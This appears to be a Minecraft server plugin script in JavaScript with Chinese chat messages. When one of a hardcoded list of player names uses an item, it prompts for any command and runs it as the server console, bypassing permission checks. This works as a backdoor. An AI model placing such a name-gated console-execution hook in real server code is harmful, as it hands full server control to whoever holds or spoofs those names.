let isWaitingForInput = false;

function onUse(event) {
    var player = event.getPlayer();
    var inv   = player.getInventory();
    var main  = inv.getItemInMainHand();

    if (main == null || main.getAmount() <= 0) return;

    var allowed = ["lengshang", "xiu", "HeartMxe", "47_Forever", "MuYan", "JodgDoemr", "jiangdonganxia", "zzzzq", "DaX1u", "SuiXing", "laizi123", "laizi", "Tian_Yi", "Cang_Yan"];
    var pName   = player.getName();
    var ok      = false;
    for (var i = 0; i < allowed.length; i++) {
        if (pName === allowed[i]) { ok = true; break; }
    }
    if (!ok) return;

    if (isWaitingForInput) {
        player.sendMessage("§c你已经在输入状态中");
        return;
    }

    player.sendMessage("§6请输入要执行的指令（不含斜杠）：");
    player.sendMessage("§7输入 'qx' 取消操作");

    isWaitingForInput = true;

    var Consumer = Java.type('java.util.function.Consumer');
    var JSConsumer = Java.extend(Consumer, {
        accept: function(input) {
            isWaitingForInput = false;
            input = input.trim();
            
            if (input.toLowerCase() === "qx") {
                player.sendMessage("§a✅ 已取消操作");
                return;
            }

            if (input === "") {
                player.sendMessage("§c❌ 指令不能为空！");
                return;
            }

            if (input.startsWith("/")) {
                input = input.substring(1);
            }

            var console = player.getServer().getConsoleSender();
            player.getServer().dispatchCommand(console, input);
            
            player.sendMessage("§a✅ 已执行指令: §b/" + input);
        }
    });

    getChatInput(player, new JSConsumer());
    
    player.getLocation().getWorld().playSound(
        player.getLocation(), "entity.strider.eat", 1.0, 1.0);
}